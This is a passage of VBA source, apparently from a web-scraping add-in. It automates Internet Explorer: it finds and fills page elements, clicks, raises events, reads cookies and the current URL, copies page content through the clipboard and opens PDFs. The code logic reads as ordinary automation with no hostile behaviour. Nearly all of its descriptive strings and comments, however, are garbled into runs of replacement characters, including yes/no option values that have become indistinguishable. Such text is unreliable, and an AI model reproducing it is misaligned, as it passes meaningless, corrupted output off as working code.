            "|fffd|.|fffd|. |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| IE, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| HTML |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
            " (|fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd|.|fffd|.)," & vbNewLine & _
            "|fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|)"
    End With
    
    With AAs.AddAction(fc_IE, "IE_GetElement", "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| Internet Explorer")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Internet Explorer" & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: |fffd||fffd| ID |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| HTML |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| input, radio button, textarea |fffd||fffd||fffd| checkbox)." & vbNewLine & _
            "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|."
        .AddParameter "SearchMode", aps_List, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", Array("ID", "Name", "Mask", "HTML filter"), "ID"
        .AddParameter "SearchParam", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Action", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("GetInnerHTML", "GetOuterHTML", "SetValue", "Click", "ReplaceOuterHTML"), "SetValue"
        .AddParameter "Value", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| SetValue"
        .AddParameter "Events", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|)", Array("", "change", "click", "keydown", "scroll"), ""
    End With
    
    With AAs.AddAction(fc_IE, "IE_WaitForData", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| Internet Explorer")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|), |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTML |fffd||fffd||fffd||fffd|."
        .AddParameter "Timeout", aps_Text, "|fffd||fffd||fffd||fffd|. |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Mask", aps_Text, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTML-|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    End With
    
    With AAs.AddAction(fc_IE, "IE_LocationURL", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| URL |fffd| Internet Explorer")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| LocationURL |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| InternetExplorer" & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| URL |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| IE, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."
    End With
    
    With AAs.AddAction(fc_IE, "IE_GetCookies", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Cookies |fffd||fffd| Internet Explorer")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Cookies |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| InternetExplorer" & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| IE." & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Cookies |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| %CookiesIE%"
        .AddParameter "Apply", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Cookies", Array("|fffd||fffd|", "|fffd||fffd||fffd|"), "|fffd||fffd|"
        .AddParameter "ReturnValue", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Cookies", Array("|fffd||fffd|", "|fffd||fffd||fffd|"), "|fffd||fffd|"
    End With
    
    With AAs.AddAction(fc_IE, "IE_CopyPageContent", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Internet Explorer")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| Crtl + A (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd|) |fffd| Ctrl + C (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)," & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| PDF |fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Attempts", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("1", "2", "5"), "1"
        .AddParameter "Format", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", Array("", "Rich Text Format", "CF_TEXT", "HTML Format", "HTML SourceURL", "CF_OEMTEXT"), ""
        .AddParameter "WaitForCopiing", aps_Text, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd|.", Array("0", "1", "2", "3", "4", "5"), "0"
        
    End With
    
    With AAs.AddAction(fc_IE, "IE_OpenPDF", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| PDF |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| IE")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| IE |fffd||fffd||fffd||fffd| PDF |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, " & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| Crtl + A (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd|) |fffd| Ctrl + C (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)," & vbNewLine & _
            "|fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| PDF |fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & _
            "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."
        .AddParameter "Timeout", aps_Text, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd|.", Array("1", "2", "3", "4", "5", "7", "10"), "1"
        .AddParameter "WaitForCopiing", aps_Text, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd|.", Array("0", "1", "2", "3", "4", "5"), "0"
        .AddParameter "Attempts", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("1", "2", "5"), "1"
        .AddParameter "Format", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", Array("", "Rich Text Format", "CF_TEXT", "HTML Format", "HTML SourceURL", "CF_OEMTEXT"), "Rich Text Format"
        .AddParameter "Download", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("|fffd||fffd|", "|fffd||fffd||fffd|"), "|fffd||fffd|"
        .AddParameter "DownloadFilename", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "CacheFilename", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
    End With
    
End Sub

Function CopyPageContentFromIE(Optional ByVal MaxAttempts& = 1, Optional ByVal ClipboardFormat$, Optional WaitForCopiing&) As String
    On Error Resume Next
    Dim Attempts&, ClipboardCleaned As Long, txt$
    If MaxAttempts& <= 0 Then MaxAttempts& = 1
    
    If Not IE Is Nothing Then
        IE.ExecWB OLECMDID_SELECTALL, OLECMDEXECOPT_PROMPTUSER, 0, 0
        IE.ExecWB OLECMDID_COPY, OLECMDEXECOPT_PROMPTUSER, 0, 0
        ' IE.ExecWB OLECMDID_FOCUSVIEWCONTROLS, OLECMDEXECOPT_DONTPROMPTUSER, 0, 0
        
        Const CLIPBOARD_CLEAR$ = "==there is nothing in Windows Clipboard=="
        Do
            ClipboardCleaned = WindowsClipboard_SetText(CLIPBOARD_CLEAR$, 10)
            Attempts& = Attempts& + 1: txt = ""
            
            CopyIEPageContent IE.Hwnd
            
            If WaitForCopiing& Then RunningParser.WaitAPause WaitForCopiing&
            
            Select Case ClipboardFormat$
                Case "": txt = WindowsClipboard_GetText
                Case Else: txt = GetContentFromClipboard(ClipboardFormat$)
            End Select
            ' Debug.Print "PDF", Left(txt, 10)
            If txt = CLIPBOARD_CLEAR$ Then txt = ""
            
        Loop While (Attempts& <= MaxAttempts&) And (txt = "")
    End If
    AppActivate Application.Name
    Err.Clear
    CopyPageContentFromIE = txt
End Function


Function ApplyHTMLFiltersToIE(ByVal Filters$) As Object
    On Error Resume Next
    Dim obj As Object, objEL As Object, found As Boolean, SearchRange As Object
    Const DEFAULT_TAG_NAME$ = "any tag"
    Set obj = IE.document.body
    Dim txt$, AttrName$, AttrValue$, TagName$, filter
    If Len(Trim(Filters$)) Then        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| HTML |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        For Each filter In Split(Filters$, "&")
            If Len(Trim(filter)) Then
                If filter Like "*?=?*" Then
                    TagName$ = DEFAULT_TAG_NAME$
                    AttrName$ = Trim(Split(filter, "=")(0))
                    AttrValue$ = Trim(Split(filter, "=")(1))
                    If AttrName$ Like "*? ?*" Then
                        TagName$ = Trim(Split(AttrName$, " ")(0))
                        AttrName$ = Trim(Split(AttrName$, " ")(1))
                    End If
                    
                    txt$ = GetTags(Replace(obj.outerHTML, """", ""), TagName$, AttrName$, AttrValue$, "outerHTML 1")
                    If Trim(txt$) = "" Then GoTo ExitApplyFiltersToIE
                    
                    If TagName$ = DEFAULT_TAG_NAME$ Then
                        Set SearchRange = obj.all
                    Else
                        Set SearchRange = obj.GetElementsByTagName(TagName$)
                    End If
                    
                    found = False
                    
                    If (TagName$ = DEFAULT_TAG_NAME$) And (AttrName$ = "id") Then
                        Set obj = Nothing
                        Set obj = IE.document.GetElementById(AttrValue$)
                        found = Not (obj Is Nothing)
                    Else
                        For Each objEL In SearchRange
                            If Replace(objEL.outerHTML, """", "") = txt$ Then
                                Set obj = objEL
                                found = True: Exit For
                            End If
                        Next objEL
                    End If
                    
                    'Debug.Print found, filter
                    If Not found Then GoTo ExitApplyFiltersToIE
                End If
            End If
        Next filter
    End If
    Set ApplyHTMLFiltersToIE = obj
ExitApplyFiltersToIE:
    
End Function

Function IE_GetElement(ByVal SearchMode$, ByVal SearchParam$, ByVal Action$, ByVal txt$, _
        Optional ByVal events$, Optional ByRef WP As WebsiteParser) As String
    On Error Resume Next
    Dim timerstart As Double, Timeout&, EL As Object, objEL As Object, found As Boolean, selOption As Object
    
    If IE Is Nothing Then IE_GetElement = "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| IE": Exit Function
    
    Timeout& = WP.Options.RequestTimeout
    If Timeout& <= 0 Then Timeout& = 4
    WaitForIE Timeout&
    
    If SHOW_PI2 Then WP.PrInd2.line3 = "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| IE ..."
    
    Select Case SearchMode$
        Case "ID"
            Set EL = IE.document.GetElementById(SearchParam$)
            
            '                        For Each objEL In IE.document.body.all
            '                         If Len(objEL.tagname) > 3 Then Debug.Print objEL.tagname, objEL.Type
            '                        Next objEL
            
        Case "Name"
            Set EL = IE.document.GetElementsByName(SearchParam$).item(0)
            
        Case "Mask"
            For Each objEL In IE.document.body.all
                If Replace(objEL.outerHTML, """", "") Like Replace(SearchParam$, """", "") Then
                    Set EL = objEL
                    Exit For
                End If
            Next objEL
            
        Case "HTML filter"
            Set EL = ApplyHTMLFiltersToIE(SearchParam$)
            
    End Select
    
    If EL Is Nothing Then
        IE_GetElement = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| |fffd||fffd| " & SearchMode$ & ", |fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & SearchParam$ & "|fffd|)"
        If SHOW_PI2 Then WP.PrInd2.line3 = ""
        Exit Function
    Else
        If SHOW_PI2 Then WP.PrInd2.line3 = "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| IE"
    End If
    
    Select Case Action$
        
        Case "GetInnerHTML"
            IE_GetElement = EL.innerHTML
            
        Case "GetOuterHTML"
            IE_GetElement = EL.outerHTML
            
        Case "SetValue"
            ' Debug.Print "type: " & EL.Type & ", value: " & txt$
            
            If EL.nodename = "div" Then
                EL.innerHTML = txt$
            Else
                Select Case EL.Type
                    Case "select-one"        ', ""        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                        If txt Like "=#*" Then
                            EL.value = Val(Mid(txt$, 2))        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
                            'EL.item(Val(Mid(txt$, 2))).Selected = True
                        Else
                            For Each selOption In EL.Options
                                If selOption.innerText Like txt$ Then
                                    EL.value = selOption.value
                                    'selOption.Selected = True
                                    Exit For
                                End If
                            Next
                        End If
                        
                    Case "checkbox", "radio"
                        EL.Checked = CBool(Val(txt$))
                        
                    Case Else
                        EL.value = txt$
                        
                End Select
            End If
            If Len(events$) Then IE_RaiseEvents EL, events$
            
        Case "Click"
            EL.Click
            If Len(events$) Then IE_RaiseEvents EL, events$
            
        Case "ReplaceOuterHTML"
            EL.outerHTML = txt
    End Select
    
    Select Case Action$
        Case "SetValue", "Click"
            WaitForIE Timeout&
            If Action$ = "Click" Then IE_GetElement = IE.document.DocumentElement.outerHTML
    End Select
    
    If SHOW_PI2 Then WP.PrInd2.line3 = ""
    Set EL = Nothing
    DoEvents
End Function

Sub IE_RaiseEvents(ByRef EL As Object, ByVal events$)
    On Error Resume Next
    Dim eventObj As Object, event_name
    events$ = Replace(events$, ";", ",")
    
    For Each event_name In Split(events$, ",")
        EL.raiseEvent "on" & event_name        ' for IE8
        
        Set eventObj = IE.document.createEvent("HTMLEvents")
        eventObj.initEvent event_name, True, False        ' for IE9 or newer
        EL.dispatchEvent eventObj
    Next
    Set eventObj = Nothing
End Sub

Function WaitForIE(Optional ByVal Timeout& = 1) As Boolean
    On Error Resume Next: Dim timerstart As Double: timerstart = Timer
    Do While IE.Busy Or (IE.readyState < 3)
        If Abs(Timer - timerstart) > Timeout& Then Exit Do
        DoEvents
    Loop
    WaitForIE = Not (IE.Busy Or (IE.readyState < 3))
End Function

Function IE_Click(ByVal ObjectToClick$, Optional ByRef WP As WebsiteParser) As String
    On Error Resume Next
    Dim timerstart As Double, Timeout&, EL As Object, found As Boolean
    
    If IE Is Nothing Then
        IE_Click = "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| IE"
        Exit Function
    End If
    
    Timeout& = WP.Options.RequestTimeout
    If Timeout& <= 0 Then Timeout& = 4
    
    WaitForIE Timeout&
    
    WP.PrInd1.ShowMessage tt("PI_ShowMessage_ClickingOnElement") & " ..."
    
    If InStr(1, Replace(IE.document.body.innerHTML, """", ""), Replace(ObjectToClick$, """", ""), vbTextCompare) > 0 Then
        WP.PrInd1.ShowMessage "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| ..."
        For Each EL In IE.document.body.all
            If Replace(EL.outerHTML, """", "") = Replace(ObjectToClick$, """", "") Then
                WP.PrInd1.ShowMessage "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|..."
                found = True
                EL.raiseEvent "onclick"
                EL.Click
                Exit For
            End If
        Next EL
        Set EL = Nothing
        WaitForIE Timeout&
        
        WP.PrInd1.ShowMessage ""
    End If
    
    If found Then
        IE_Click = IE.document.DocumentElement.outerHTML
    Else
        IE_Click = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
    End If
    DoEvents
End Function

Function ShowRunningIE(ByVal URL$, Optional ActivateWindow As Boolean = True) As String
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| IE, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| URL$
    On Error Resume Next
    If Not IE Is Nothing Then If ActivateWindow Then IE.Visible = True
    
    Dim w As WebBrowser, oShellWind As New ShellWindows, found As Boolean, n&
    
LabelShowRunningIE:
    If TEST_ACTIONS_MODE Then
        AddBalloon "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| IE |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & CreateHTMLlink(URL$), bt_Information
        For Each w In oShellWind
            n = n + 1
            AddBalloon "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| #" & n & " " & IIf(w.LocationURL Like URL$, "(ok)", "") & ": " & CreateHTMLlink(w.LocationURL)
        Next
    End If
    
    For Each w In oShellWind
        ' Debug.Print w.LocationURL
        If w.LocationURL Like URL$ Then
            If ActivateWindow Then
                ShowWindow w.Hwnd, 5
                SetForegroundWindow w.Hwnd
            End If
            found = True: Set IE = w
            If TEST_ACTIONS_MODE Then AddBalloon "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| IE |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & CreateHTMLlink(w.LocationURL), bt_Information
            Exit For
        End If
    Next
    Set oShellWind = Nothing
    
    If found Then
        ShowRunningIE = IE.document.DocumentElement.outerHTML
    Else
